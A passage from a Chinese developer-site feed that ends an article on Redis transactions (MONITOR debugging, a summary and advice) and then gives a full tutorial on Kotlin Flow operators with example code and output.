<li><strong><code>redis-cli</code> 调试</strong>：用 <code>MONITOR</code> 命令观察事务执行过程，确认命令是否按预期入队和执行。</li>
<li><strong>日志记录</strong>：在客户端记录每次事务的输入和输出，便于事后分析。</li>
<li><strong>压力测试</strong>：用工具如 <code>redis-benchmark</code> 模拟高并发，验证事务性能。</li>
</ul>
<p><strong>示例：用 redis-cli 调试</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 监控实时命令</span>
redis-cli MONITOR
<span class="hljs-comment"># 客户端执行事务</span>
MULTI
SET key1 val1
EXEC
<span class="hljs-comment"># MONITOR 输出：</span>
<span class="hljs-string">" MULTI"</span>
<span class="hljs-string">" SET key1 val1"</span>
<span class="hljs-string">" EXEC"</span>
</code></pre>
<p>通过本章，你不仅看到了 Redis 事务在真实项目中的应用，还学到了如何避坑和优化设计。这些经验就像“前辈的叮嘱”，希望能帮你在自己的项目中少走弯路。接下来，我们将进入总结与展望部分，提炼核心要点并看看 Redis 事务的未来。最后一章，敬请期待！</p>
<hr/>
<h2 data-id="heading-59">七、总结与展望（约400-500字）</h2>
<p>经过前几章的旅程，我们从 Redis 事务的基础原理，到 <code>MULTI</code> 和 <code>EXEC</code> 的深入剖析，再到 <code>WATCH</code> 的乐观锁实战，最后结合项目经验探索了最佳实践。现在，是时候停下来回顾一下收获，并为你的下一步实践指明方向了。让我们一起总结要点，展望未来！</p>
<h3 data-id="heading-60">1. 核心要点回顾</h3>
<ul>
<li><strong><code>MULTI/EXEC</code> 的原子性与局限</strong>：<code>MULTI</code> 和 <code>EXEC</code> 提供了一个轻量级的原子操作框架，适合批量更新场景。但它不支持回滚，错误处理需要客户端提前设计。这种“简单粗暴”的风格，既是优势也是挑战。</li>
<li><strong><code>WATCH</code> 的乐观锁特性与实战价值</strong>：<code>WATCH</code> 为事务引入了并发控制能力，像一个敏锐的“哨兵”，在库存扣减、秒杀等场景中大显身手。它的轻量性和高效性，让高并发下的数据一致性不再是难题。</li>
<li><strong>实践中的取舍</strong>：事务虽好，但不能滥用。结合 Lua 脚本、优化命令数量、处理分布式限制，都是项目中需要权衡的关键。</li>
</ul>
<h3 data-id="heading-61">2. 对读者的建议</h3>
<p>想在项目中用好 Redis 事务？这里有几条实战建议：</p>
<ul>
<li><strong>从小处入手</strong>：先用 <code>MULTI/EXEC</code> 解决简单场景，比如缓存批量更新，熟悉后再尝试 <code>WATCH</code>。</li>
<li><strong>预判与验证</strong>：设计事务时，提前考虑失败场景，加入结果校验和重试逻辑。</li>
<li><strong>持续学习</strong>：关注 Redis 的新版本，比如 6.0+ 引入的改进（如更强的客户端支持），它们可能为事务带来新可能。</li>
</ul>
<p>具体实践时，不妨从一个小功能开始，比如用事务实现积分累加，然后逐步扩展到并发控制场景。边做边调，你会发现 Redis 事务的魅力。</p>
<h3 data-id="heading-62">3. 结语与展望</h3>
<p>Redis 事务机制虽然不算完美，但它用最小的代价实现了最大的价值，这正是 Redis “快而灵活”哲学的体现。未来，随着 Redis 在分布式系统中的应用加深，事务功能可能会进一步增强，比如更好的集群支持或更灵活的错误处理机制。作为开发者，保持对新技术的好奇心，持续探索，才能在变化中找到最佳解法。</p>
<p>最后，我想邀请你留言分享自己的实战经验。你在项目中如何用 Redis 事务解决难题？踩过哪些坑？欢迎在评论区交流，让我们一起成长！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[十分钟速览 Kotlin Flow 操作符]]></title>    <link>https://juejin.cn/post/7581870491762671668</link>    <guid>https://juejin.cn/post/7581870491762671668</guid>    <pubDate>2025-12-10T02:51:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581870491762671668" data-draft-id="7576532425761865743" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="十分钟速览 Kotlin Flow 操作符"/> <meta itemprop="keywords" content="Kotlin,Android"/> <meta itemprop="datePublished" content="2025-12-10T02:51:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RockByte"/> <meta itemprop="url" content="https://juejin.cn/user/1046390797768519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            十分钟速览 Kotlin Flow 操作符
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390797768519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RockByte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:51:59.000Z" title="Wed Dec 10 2025 02:51:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#5f6368;background-image:linear-gradient(90deg,rgba(240,191,213,.1) 3%,transparent 0),linear-gradient(1turn,rgba(240,191,213,.1) 3%,transparent 0);background-size:20px 20px;background-position:50%;letter-spacing:1px;word-spacing:1px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position:relative;line-height:1.5;margin-top:35px;margin-bottom:10px;padding-left:50px;padding-bottom:5px;color:#5f6368}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{position:absolute;left:0;display:block;content:""}.markdown-body h1{font-size:32px;margin-bottom:5px}.markdown-body h1:before{top:0;content:"🦄";font-size:32px}.markdown-body h2{padding-bottom:24px;border-bottom:1px solid #ececec}.markdown-body h2:before{top:0;left:8px;content:"🐳";font-size:24px}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{top:-2px;left:8px;content:"🐄";font-size:20px}.markdown-body h4{font-size:16px}.markdown-body h4:before{top:-2px;left:8px;content:"🦥";font-size:18px}.markdown-body h5{font-size:14px}.markdown-body h5:before{top:-2px;left:9px;content:"🦩";font-size:16px}.markdown-body h6{font-size:12px;margin-top:5px}.markdown-body h6:before{top:-1px;left:10px;content:"🐧";font-size:14px}.markdown-body p{line-height:1.9;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid rgba(253,121,168,.5);margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#a6accd;background:#292d3e;border-radius:8px}.markdown-body a{text-decoration:none;color:#fd79a8;border-bottom:1px solid #fd79a8;padding:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(253,121,168,.1);color:#ee69a9}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body th{color:#fd79a8}.markdown-body th,.markdown-body tr:hover{background:rgba(253,121,168,.1)}.markdown-body td{min-width:120px}.markdown-body blockquote{position:relative;color:#666;padding:23px;margin:22px 0;border-left:4px solid #ee69a9;background-color:rgba(253,121,168,.1)}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;display:block;font-size:27px;color:#fd79a8;opacity:.8}.markdown-body blockquote:before{left:10px;top:0;content:"❝"}.markdown-body blockquote:after{right:10px;bottom:0;content:"❞"}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body strong{position:relative;color:#fd79a8}.markdown-body strong:before{content:"· "}.markdown-body strong:after{content:" ·"}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#fd79a8}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#ee69a9}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml .hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45ccff6af8264a94b405eb6256e92583~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=A3luuQF1pk0FqsnwK7gsFyqQ%2BnY%3D" alt="0.png" loading="lazy"/></p>
<p>实时的用户输入、多个网络请求的响应，再加上数据库的频繁更新，很容易让你的代码变得混乱不堪。而这，正是 Kotlin <code>Flow</code> 要帮你解决的问题。</p>
<p>作为基于协程构建的响应式流 API，Kotlin <code>Flow</code> 让你可以用声明式的方式优雅地处理异步数据流。但要想真正发挥它的强大能力，关键在于熟练掌握各种操作符。</p>
<p>本指南就是为你量身打造的速查手册——聚焦最核心的操作符，清晰说明它们的适用场景和使用方法，助你高效驾驭 Kotlin <code>Flow</code>。</p>
<hr/>
<h2 data-id="heading-0">一对一转换</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa9d45c2173c472786e17da65c24b33e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=SVd%2BnDSbrk2I1VP5MasvDPlk9I0%3D" alt="2.png" loading="lazy"/></p>
<h3 data-id="heading-1">map</h3>
<p>将 <code>Flow</code> 中发出的每个元素转换为新元素，实现一对一映射。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin">
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    flowOf(<span class="hljs-string">"Kotlin"</span>, <span class="hljs-string">"Flow"</span>)
        .map { <span class="hljs-string">"Length of '<span class="hljs-variable">$it</span>' is <span class="hljs-subst">${it.length}</span>"</span> }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Length of 'Kotlin' is 6</span>
<span class="hljs-comment">// Length of 'Flow' is 4</span>
</code></pre>
<p>适用场景：需要将每个项转换为不同类型或格式，例如在 <code>ViewModel</code> 中将 <code>Date</code> 对象格式化为可显示的 <code>String</code>。</p>
<h3 data-id="heading-2">filter</h3>
<p>仅允许满足给定条件的元素通过。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    (<span class="hljs-number">1.</span><span class="hljs-number">.5</span>).asFlow()
        .filter { it % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 4</span>
</code></pre>
<p>适用场景：根据条件丢弃不需要的值，例如过滤空搜索词或无效数据。</p>
<h3 data-id="heading-3">take</h3>
<p>限制性操作符，仅发出 <code>Flow</code> 的前 <code>n</code> 个元素，随后取消 <code>Flow</code> 执行。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    (<span class="hljs-number">1.</span><span class="hljs-number">.10</span>).asFlow()
        .take(<span class="hljs-number">3</span>)
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 3</span>
</code></pre>
<p>适用场景：只需要有限数量的项，例如分页加载，或从一系列操作中取第一个有效结果。</p>
<hr/>
<h2 data-id="heading-4">累积值</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed8dfb6e502c43d9b4b7551be1fc8011~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=1COawG3a%2BdsCCD5sHH3RERsW0XU%3D" alt="3.png" loading="lazy"/></p>
<h3 data-id="heading-5">reduce</h3>
<p>终端操作符，从 <code>Flow</code> 的第一个元素开始累积值，并对当前累加器与每个元素执行操作。若 <code>Flow</code> 为空则抛出异常。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-keyword">val</span> sum = (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow().reduce { accumulator, value -&gt; accumulator + value }
    println(sum)
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 6</span>
</code></pre>
<h3 data-id="heading-6">fold</h3>
<p>类似于 <code>reduce</code>，但 <code>fold</code> 需要一个初始值，是更安全的选择。</p>
<p>即使 <code>Flow</code> 为空也会返回初始值。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    <span class="hljs-keyword">val</span> sum = (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow().fold(<span class="hljs-number">100</span>) { accumulator, value -&gt; accumulator + value }
    println(sum)
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 106</span>
</code></pre>
<h3 data-id="heading-7">runningReduce / scan</h3>
<p>中间操作符，在每个元素处理时都发出当前累积值。</p>
<p><em>中间操作符不会触发 <code>Flow</code> 的收集，所以需要 <code>collect</code> 触发 <code>Flow</code> 的收集，而 <code>reduce</code> 这种终端操作符会触发 <code>Flow</code> 的收集。</em></p>
<p><code>scan</code> 是更通用的版本，支持指定初始种子值。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"runningReduce:"</span>)
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .runningReduce { accumulator, value -&gt; accumulator + value }
        .collect { println(it) } 

    println(<span class="hljs-string">"scan:"</span>)
    (<span class="hljs-number">1.</span><span class="hljs-number">.3</span>).asFlow()
        .scan(<span class="hljs-number">0</span>) { accumulator, value -&gt; accumulator + value }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// runningReduce:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// 6</span>
<span class="hljs-comment">// scan:</span>
<span class="hljs-comment">// 0</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// 6</span>
</code></pre>
<p>注意：他们会返回每一步的结果，而 <code>reduce</code>/<code>fold</code> 只返回最终结果。</p>
<p>适用场景：计算累计总和、跟踪进度，或在状态机中展示状态历史。</p>
<hr/>
<h2 data-id="heading-8">发出多个值</h2>
<h3 data-id="heading-9">transform</h3>
<p>高度灵活的操作符，可为每个输入元素发出零个、一个或多个值，对输出流有更强控制力。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    (<span class="hljs-number">1.</span><span class="hljs-number">.2</span>).asFlow()
        .transform {
            emit(<span class="hljs-string">"Item: <span class="hljs-variable">$it</span>"</span>)
            <span class="hljs-keyword">if</span> (it % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>) {
                emit(<span class="hljs-string">"...is an odd number"</span>)
            }
            emit(<span class="hljs-string">"Square: <span class="hljs-subst">${it * it}</span>"</span>)
        }.collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Item: 1</span>
<span class="hljs-comment">// ...is an odd number</span>
<span class="hljs-comment">// Square: 1</span>
<span class="hljs-comment">// Item: 2</span>
<span class="hljs-comment">// Square: 4</span>
</code></pre>
<p>适用场景：执行复杂转换、引入副作用（如日志记录），或根据单个输入有条件地发出多个值。</p>
<hr/>
<h2 data-id="heading-10">扁平化嵌套</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b154009cd2e4d66b4c5014e5ae8641e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=MxLI8kVIGB3BJ5Zg4Ln7RIwwYns%3D" alt="4.png" loading="lazy"/></p>
<h3 data-id="heading-11">flatMapConcat</h3>
<p>将每个元素转换为一个 <code>Flow</code>，然后依次连接这些 <code>Flow</code>，只有当前一个 <code>Flow</code> 完成后，下一个才开始。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getNumbersFlow</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: Flow&lt;String&gt; = flow {
    delay(<span class="hljs-number">100</span>)
    emit(<span class="hljs-string">"First-<span class="hljs-variable">$id</span>"</span>)
    delay(<span class="hljs-number">100</span>)
    emit(<span class="hljs-string">"Second-<span class="hljs-variable">$id</span>"</span>)
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    (<span class="hljs-number">1.</span><span class="hljs-number">.2</span>).asFlow().flatMapConcat { id -&gt; getNumbersFlow(id) }.collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// First-1</span>
<span class="hljs-comment">// Second-1</span>
<span class="hljs-comment">// First-2</span>
<span class="hljs-comment">// Second-2</span>
</code></pre>
<p><em>仔细看，第一个流的每个数字都会参与到第二个流中。</em></p>
<p>适用场景：顺序敏感的操作，例如依次上传多个文件，或执行依赖型网络请求。</p>
<h3 data-id="heading-12">flatMapMerge</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4254fe85b6c142c687e6a790fa6c97a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=o%2FW51%2FAQwiZtZ0aXVrUeQpyxh94%3D" alt="1.png" loading="lazy"/></p>
<p>并发合并由转换函数生成的多个 <code>Flow</code>，可通过 <code>concurrency</code> 参数控制并发数量。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getNumbersFlow</span><span class="hljs-params">(id: <span class="hljs-type">Int</span>)</span></span>: Flow&lt;String&gt; = flow {
    delay(<span class="hljs-number">100</span>)
    emit(<span class="hljs-string">"First-<span class="hljs-variable">$id</span>"</span>)
    delay(<span class="hljs-number">100</span>)
    emit(<span class="hljs-string">"Second-<span class="hljs-variable">$id</span>"</span>)
}

<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    (<span class="hljs-number">1.</span><span class="hljs-number">.2</span>).asFlow()
        .flatMapMerge { id -&gt; getNumbersFlow(id) }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// First-1</span>
<span class="hljs-comment">// First-2</span>
<span class="hljs-comment">// Second-2</span>
<span class="hljs-comment">// Second-1</span>
</code></pre>
<p>从结果上注意区分 <code>flatMapConcat</code>，<code>flatMapMerge</code> 不会保证合并的顺序。</p>
<p>适用场景：顺序无关的并行操作，例如同时从多个数据源获取数据。</p>
<h3 data-id="heading-13">flatMapLatest</h3>
<p>当新元素发出时，立即取消上一个元素对应的 <code>Flow</code>。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">val</span> searchQuery = flowOf(<span class="hljs-string">"search"</span>, <span class="hljs-string">"search with new term"</span>).onEach { delay(<span class="hljs-number">200</span>) }

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">searchApi</span><span class="hljs-params">(query: <span class="hljs-type">String</span>)</span></span>: Flow&lt;String&gt; = flow {
    emit(<span class="hljs-string">"Searching for '<span class="hljs-variable">$query</span>'..."</span>)
    delay(<span class="hljs-number">500</span>) <span class="hljs-comment">// 模拟网络延迟</span>
    emit(<span class="hljs-string">"Results for '<span class="hljs-variable">$query</span>'"</span>)
}

<span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    searchQuery
        .flatMapLatest { query -&gt; searchApi(query) }
        .collect { println(it) }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Searching for 'search'...</span>
<span class="hljs-comment">// Searching for 'search with new term'...</span>
<span class="hljs-comment">// Results for 'search with new term'</span>
</code></pre>
<p>适用场景：实时搜索功能，或任何只需关注最新事件结果的场景。</p>
<hr/>
<h2 data-id="heading-14">上下文与缓冲</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce7e6dce687947efa5a9c0ff702537f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765939918&amp;x-signature=Una%2BLIFuOR1cwRS6q6ZRLj2aj28%3D" alt="5.png" loading="lazy"/></p>
<h3 data-id="heading-15">flowOn</h3>
<p>更改用于执行上游 <code>Flow</code> 的 <code>CoroutineContext</code>，是 <code>Flow</code> 中切换调度器的正确方式。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">heavyWork</span><span class="hljs-params">()</span></span>: Flow&lt;<span class="hljs-built_in">Int</span>&gt; = flow {
    println(<span class="hljs-string">"Starting heavy work on <span class="hljs-subst">${Thread.currentThread().name}</span>"</span>)
    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.3</span>) {
        <span class="hljs-comment">// Simulate CPU-intensive work</span>
        Thread.sleep(<span class="hljs-number">100</span>)
        emit(i)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    heavyWork()
        .flowOn(Dispatchers.IO) <span class="hljs-comment">// Upstream runs on IO dispatcher</span>
        .collect {
            println(<span class="hljs-string">"Collected <span class="hljs-variable">$it</span> on <span class="hljs-subst">${Thread.currentThread().name}</span>"</span>)
        }
    <span class="hljs-comment">// Downstream runs on the collector's context (e.g., Main)</span>
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Starting heavy work on DefaultDispatcher-worker-1</span>
<span class="hljs-comment">// Collected 1 on main</span>
<span class="hljs-comment">// Collected 2 on main</span>
<span class="hljs-comment">// Collected 3 on main</span>
</code></pre>
<h3 data-id="heading-16">buffer</h3>
<p>通过解耦生产者与消费者实现并发执行：生产者将项放入缓冲区，消费者从中取出。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> time = measureTimeMillis {
        flow {
            <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.3</span>) {
                delay(<span class="hljs-number">200</span>) <span class="hljs-comment">// Simulate slow emission</span>
                emit(i)
            }
        }
        .buffer() <span class="hljs-comment">// With buffer, the total time is closer to the slow collector's time</span>
        .collect {
            delay(<span class="hljs-number">300</span>) <span class="hljs-comment">// Simulate slow collection</span>
            println(it)
        }
    }
    println(<span class="hljs-string">"Collected in <span class="hljs-variable">$time</span> ms"</span>)
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// 1</span>
<span class="hljs-comment">// 2</span>
<span class="hljs-comment">// 3</span>
<span class="hljs-comment">// Collected in 1172 ms</span>
</code></pre>
<p>得益于 <code>buffer</code>，最后整个数据的收集时间要小于 <code>(200 + 300) * 3</code>。</p>
<p>使用场景：当生产者与消费者处理速度不一致时，提升性能。</p>
<h3 data-id="heading-17">conflate</h3>
<p>一种缓冲形式，当收集器处理太慢时会丢弃中间值，确保始终获取最新值。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    flow {
        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">1.</span><span class="hljs-number">.5</span>) {
            delay(<span class="hljs-number">100</span>)
            emit(i)
        }
    }
    .conflate()
    .collect { value -&gt;
        println(<span class="hljs-string">"Started processing <span class="hljs-variable">$value</span>"</span>)
        delay(<span class="hljs-number">300</span>)
        println(<span class="hljs-string">"Finished processing <span class="hljs-variable">$value</span>"</span>)
    }
}

<span class="hljs-comment">// output:</span>
<span class="hljs-comment">// Started processing 1</span>
<span class="hljs-comment">// Finished processing 1</span>
<span class="hljs-comment">// Started processing 3</span>
<span class="hljs-comment">// Finished processing 3</span>
<span class="hljs-comment">// Started processing 5</span>
<span class="hljs-comment">// Finished processing 5</span>
</code></pre>
<p>适用场景：UI 更新中无需显示中间状态，如股票行情或 GPS 位置更新。</p>
